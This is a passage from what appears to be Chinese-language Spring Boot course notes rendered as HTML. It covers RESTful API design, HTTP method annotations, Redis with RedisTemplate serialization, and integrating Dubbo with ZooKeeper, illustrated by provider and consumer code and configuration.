&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;业务方法addStudent&quot;</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">rows</span>  <span class="operator">=</span>  studentDao.insert(student);</span><br><span class="line">    System.out.println(<span class="string">&quot;执行sql语句&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//抛出一个运行时异常， 目的是回滚事务</span></span><br><span class="line">    <span class="comment">//int m   = 10 / 0 ;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rows;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第五章-接口架构风格-—RESTful"><a href="#第五章-接口架构风格-—RESTful" class="headerlink" title="第五章 接口架构风格 —RESTful"></a>第五章 接口架构风格 —RESTful</h1><p>接口： API（Application Programming Interface，应用程序接口）是一些预先定义的接口（如函数、HTTP接口），或指<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F/224122">软件系统</a>不同组成部分衔接的约定。 用来提供<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">应用程序</a>与开发人员基于某<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6">软件</a>或硬件得以访问的一组<a href="https://baike.baidu.com/item/%E4%BE%8B%E7%A8%8B/2390628">例程</a>，而又无需访问源码，或理解内部<a href="https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6/9905789">工作机制</a>的细节。</p><p>接口（API）： 可以指访问servlet， controller的url，   调用其他程序的 函数</p><p>架构风格： api组织方式（样子）</p><p>  <a href="http://localhost:9002/mytrans/addStudent?name=lisi&age=26">http://localhost:9002/mytrans/addStudent?name=lisi&amp;age=26</a><br>​                                      在地址上提供了 访问的资源名称addStudent, 在其后使用了get方式传递参数。</p><h3 id="5-1-REST"><a href="#5-1-REST" class="headerlink" title="5.1  REST"></a>5.1  REST</h3><p>RESTful架构风格</p><p>1）REST :  （英文： Representational State Transfer , 中文： 表现层状态转移)。</p><p>   REST：是一种接口的架构风格和设计的理念，不是标准。</p><p>   优点： 更简洁，更有层次</p><p>   表现层状态转移: </p><p>​         表现层就是视图层， 显示资源的， 通过视图页面，jsp等等显示操作资源的结果。</p><p>​          状态： 资源变化</p><p>​         转移： 资源可以变化的。 资源能创建，new状态，  资源创建后可以查询资源， 能看到资源的内容，</p><p>这个资源内容 ，可以被修改， 修改后资源 和之前的不一样。  </p><p>2）REST中的要素：</p><p>   用REST表示资源和对资源的操作。  在互联网中，表示一个资源或者一个操作。 </p><p>   资源使用url表示的， 在互联网， 使用的图片，视频， 文本，网页等等都是资源。</p><p>   资源是用名词表示。</p><p>  对资源： </p><p>​        查询资源： 看，通过url找到资源。 </p><p>​        创建资源： 添加资源</p><p>​        更新资源：更新资源 ，编辑</p><p>​        删除资源： 去除</p><p>​       </p><p> 资源使用url表示，通过名词表示资源。</p><p>​     在url中，使用名词表示资源， 以及访问资源的信息,  在url中，使用“ &#x2F; “ 分隔对资源的信息</p><p>​     <a href="http://localhost:8080/myboot/student/1001">http://localhost:8080/myboot/student/1001</a></p><p> 使用http中的动作（请求方式）， 表示对资源的操作（CURD）</p><p>   GET:  查询资源  –  sql select</p><p>​                 处理单个资源： 用他的单数方式</p><p>​                  <a href="http://localhost:8080/myboot/student/1001">http://localhost:8080/myboot/student/1001</a></p><p>​                 <a href="http://localhost:8080/myboot/student/1001/1">http://localhost:8080/myboot/student/1001/1</a></p><p>​                处理多个资源：使用复数形式</p><p>​                  <a href="http://localhost:8080/myboot/students/1001/1002">http://localhost:8080/myboot/students/1001/1002</a></p><p>​                </p><p>   POST: 创建资源  – sql insert</p><p>​                <a href="http://localhost:8080/myboot/student">http://localhost:8080/myboot/student</a></p><p>​                在post请求中传递数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8080/myboot/student&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">姓名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">    年龄：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   PUT： 更新资源  –  sql  update</p>   <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8080/myboot/student/1&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">姓名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">    年龄：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_method&quot;</span> <span class="attr">value</span>=<span class="string">&quot;PUT&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   DELETE: 删除资源  – sql delete</p>   <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost:8080/myboot/student/1&quot;</span>&gt;</span>删除1的数据<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 需要的分页，  排序等参数，依然放在  url的后面， 例如 </p><p> <a href="http://localhost:8080/myboot/students?page=1&pageSize=20">http://localhost:8080/myboot/students?page=1&amp;pageSize=20</a></p><p>3）一句话说明REST： </p><p>​    使用url表示资源 ，使用http动作操作资源。</p><p>4）注解</p><p>  @PathVariable :  从url中获取数据</p><p>  @GetMapping:    支持的get请求方式，  等同于 @RequestMapping( method&#x3D;RequestMethod.GET)</p><p>  @PostMapping:  支持post请求方式 ，等同于 @RequestMapping( method&#x3D;RequestMethod.POST)</p><p>  @PutMapping:  支持put请求方式，  等同于 @RequestMapping( method&#x3D;RequestMethod.PUT)</p><p>   @DeleteMapping: 支持delete请求方式，  等同于 @RequestMapping( method&#x3D;RequestMethod.DELETE)</p><p>  @RestController:  符合注解， 是@Controller 和@ResponseBody组合。</p><p>​               在类的上面使用@RestController ， 表示当前类者的所有方法都加入了 @ResponseBody</p><p>5）Postman : 测试工具</p><p>   使用Postman : 可以测试 get ，post ， put ，delete 等请求</p><h3 id="5-2-在页面中或者ajax中，支持put，delete请求"><a href="#5-2-在页面中或者ajax中，支持put，delete请求" class="headerlink" title="5.2  在页面中或者ajax中，支持put，delete请求"></a>5.2  在页面中或者ajax中，支持put，delete请求</h3><p>在SpringMVC中 有一个过滤器， 支持post请求转为put ,delete</p><p>过滤器： org.springframework.web.filter.HiddenHttpMethodFilter</p><p>作用： 把请求中的post请求转为 put ， delete</p><p>实现步骤：</p><ol><li>application.properties(yml) : 开启使用 HiddenHttpMethodFilter 过滤器</li><li>在请求页面中，包含 _method参数， 他的值是 put， delete  ，  发起这个请求使用的post方式</li></ol><h1 id="第六章-Redis"><a href="#第六章-Redis" class="headerlink" title="第六章 Redis"></a>第六章 Redis</h1><p>Redis ： 一个NoSQL数据库，  常用作 缓存使用 （cache）</p><p>Redis的数据类型： string  ,  hash  ,set  ,zset , list</p><p>Redis是一个中间件： 是一个独立的服务器。</p><p>java中著名的客户端： Jedis ，  lettuce ， Redisson</p><p>Spring,SpringBoot中有 一个RedisTemplate（StringRedisTemplate） ，处理和redis交互  </p><h2 id="6-1-配置Windows版本的redis"><a href="#6-1-配置Windows版本的redis" class="headerlink" title="6.1  配置Windows版本的redis"></a>6.1  配置Windows版本的redis</h2><p>Redis-x64-3.2.100.rar 解压缩到一个 非中文 的目录</p><p>redis-server.exe：服务端， 启动后，不要关闭</p><p>redis-cli.exe：客户端， 访问redis中的数据</p><p>redisclient-win32.x86_64.2.0.jar : Redis图形界面客户端</p><p>执行方式： 在这个文件所在的目录，  执行 java -jar redisclient-win32.x86_64.2.0.jar</p><p>RedisTemplate 使用的  lettuce 客户端库</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--redis起步依赖： 直接在项目中使用RedisTemplate(StringRedisTemplate)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">data-redis使用的   lettuce 客户端库</span><br><span class="line"></span><br><span class="line">在程序中使用RedisTemplate类的方法 操作redis数据， 实际就是调用的lettuce 客户端的中的方法</span><br></pre></td></tr></table></figure><h2 id="6-2-对比-StringRedisTemplate-和-RedisTemplate"><a href="#6-2-对比-StringRedisTemplate-和-RedisTemplate" class="headerlink" title="6.2 对比 StringRedisTemplate 和 RedisTemplate"></a>6.2 对比 StringRedisTemplate 和 RedisTemplate</h2><p>StringRedisTemplate ： 把k，v 都是作为String处理， 使用的是String的序列化 ， 可读性好</p><p>RedisTemplate ： 把k，v 经过了序列化存到redis。 k，v 是序列化的内容， 不能直接识别.</p><p>​                                 默认使用的jdk序列化， 可以修改为前提的序列化</p><p> 序列化：把对象转化为可传输的字节序列过程称为序列化。</p><p>反序列化：把字节序列还原为对象的过程称为反序列化。</p><p>为什么需要序列化</p><p>序列化最终的目的是为了对象可以跨平台存储，和进行网络传输。而我们进行跨平台存储和网络传输的方式就是IO，而我们的IO支持的数据格式就是字节数组。我们必须在把对象转成字节数组的时候就制定一种规则（序列化），那么我们从IO流里面读出数据的时候再以这种规则把对象还原回来（反序列化）。</p><p>什么情况下需要序列化</p><p>通过上面我想你已经知道了凡是需要进行“跨平台存储”和”网络传输”的数据，都需要进行序列化。</p><p>本质上存储和网络传输 都需要经过 把一个对象状态保存成一种跨平台识别的字节格式，然后其他的平台才可以通过字节信息解析还原对象信息。</p><p>序列化的方式</p><p>序列化只是一种拆装组装对象的规则，那么这种规则肯定也可能有多种多样，比如现在常见的序列化方式有：</p><p>JDK（不支持跨语言）、JSON、XML、Hessian、Kryo（不支持跨语言）、Thrift、Protofbuff、</p><p>Student( name&#x3D;zs, age&#x3D;20)   —-  { “name”:”zs”, “age”:20 }</p><p>java的序列化： 把java对象转为byte[], 二进制数据</p><p>json序列化：json序列化功能将对象转换为 JSON 格式或从 JSON 格式转换对象。例如把一个Student对象转换为JSON字符串{“name”:”李四”, “age”:29} )，反序列化(将JSON字符串 {“name”:”李四”, “age”:29} 转换为Student对象)</p><p>设置key或者value的序列化方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用RedisTemplate ，在存取值之前，设置序列化</span></span><br><span class="line"><span class="comment">// 设置 key 使用String的序列化</span></span><br><span class="line">redisTemplate.setKeySerializer( <span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 value 的序列化</span></span><br><span class="line">redisTemplate.setValueSerializer( <span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>());</span><br><span class="line"></span><br><span class="line">redisTemplate.opsForValue().set(k,v);</span><br></pre></td></tr></table></figure><h1 id="第七章-SpringBoot集成Dubbo"><a href="#第七章-SpringBoot集成Dubbo" class="headerlink" title="第七章 SpringBoot集成Dubbo"></a>第七章 SpringBoot集成Dubbo</h1><h2 id="7-1-看-SpringBoot继承Dubbo的文档"><a href="#7-1-看-SpringBoot继承Dubbo的文档" class="headerlink" title="7.1  看 SpringBoot继承Dubbo的文档"></a>7.1  看 SpringBoot继承Dubbo的文档</h2><p> <a href="https://github.com/apache/dubbo-spring-boot-project/blob/master/README_CN.md">https://github.com/apache/dubbo-spring-boot-project/blob/master/README_CN.md</a></p><h2 id="7-2-公共项目"><a href="#7-2-公共项目" class="headerlink" title="7.2  公共项目"></a>7.2  公共项目</h2><p>独立的maven项目： 定义了接口和数据类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1901229007746699151L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line"></span><br><span class="line">    Student <span class="title function_">queryStudent</span><span class="params">(Integer id)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="7-3-提供者"><a href="#7-3-提供者" class="headerlink" title="7.3  提供者"></a>7.3  提供者</h2><p>创建SpringBoot项目</p><p>1） pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--加入公共项目的gav--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.bjpowernode<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>022-interface-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--dubbo依赖--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.dubbo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--zookeeper依赖--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.dubbo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo-dependencies-zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- 排除log4j依赖 --&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2）实现接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用dubbo中的注解暴露服务</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Component</span> 可以不用加</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@DubboService(interfaceClass = StudentService.class,version = &quot;1.0&quot;,timeout = 5000)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Student <span class="title function_">queryStudent</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        <span class="keyword">if</span>( <span class="number">1001</span> == id)&#123;</span><br><span class="line">            student.setId(<span class="number">1001</span>);</span><br><span class="line">            student.setName(<span class="string">&quot;------1001-张三&quot;</span>);</span><br><span class="line">            student.setAge(<span class="number">20</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="number">1002</span>  == id)&#123;</span><br><span class="line">            student.setId(<span class="number">1002</span>);</span><br><span class="line">            student.setName(<span class="string">&quot;#######1002-李四&quot;</span>);</span><br><span class="line">            student.setAge(<span class="number">22</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3）application.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置服务名称 dubbo:application name=&quot;名称&quot;</span></span><br><span class="line"><span class="attr">spring.application.name</span>=<span class="string">studentservice-provider</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#配置扫描的包， 扫描的@DubboService</span></span><br><span class="line"><span class="attr">dubbo.scan.base-packages</span>=<span class="string">com.bjpowernode.service</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#配置dubbo协议</span></span><br><span class="line"><span class="comment">#dubbo.protocol.name=dubbo</span></span><br><span class="line"><span class="comment">#dubbo.protocol.port=20881</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#注册中心</span></span><br><span class="line"><span class="attr">dubbo.registry.address</span>=<span class="string">zookeeper://localhost:2181</span></span><br></pre></td></tr></table></figure><p>4)在启动类的上面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDubbo</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProviderApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      SpringApplication.run(ProviderApplication.class, args);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-4消费者"><a href="#7-4消费者" class="headerlink" title="7.4消费者"></a>7.4消费者</h2><p>创建SpringBoot项目</p><p>1） pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--加入公共项目的gav--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.bjpowernode<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>022-interface-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--dubbo依赖--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.dubbo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--zookeeper依赖--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.dubbo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo-dependencies-zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- 排除log4j依赖 --&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>创建了Controller 或者 Service都可以</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DubboController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 引用远程服务， 把创建好的代理对象，注入给studentService</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//@DubboReference(interfaceClass = StudentService.class,version = &quot;1.0&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 没有使用interfaceClass，默认的就是 引用类型的 数据类型</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">    <span class="meta">@DubboReference(version = &quot;1.0&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> StudentService studentService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/query&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">queryStudent</span><span class="params">(Integer id)</span>&#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span>   <span class="operator">=</span> studentService.queryStudent(id);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;调用远程接口，获取对象：&quot;</span>+student;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3）application.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定服务名称</span></span><br><span class="line"><span class="attr">spring.application.name</span>=<span class="string">consumer-application</span></span><br><span class="line"><span class="comment">#指定注册中心</span></span><br><span class="line"><span class="attr">dubbo.registry.address</span>=<span 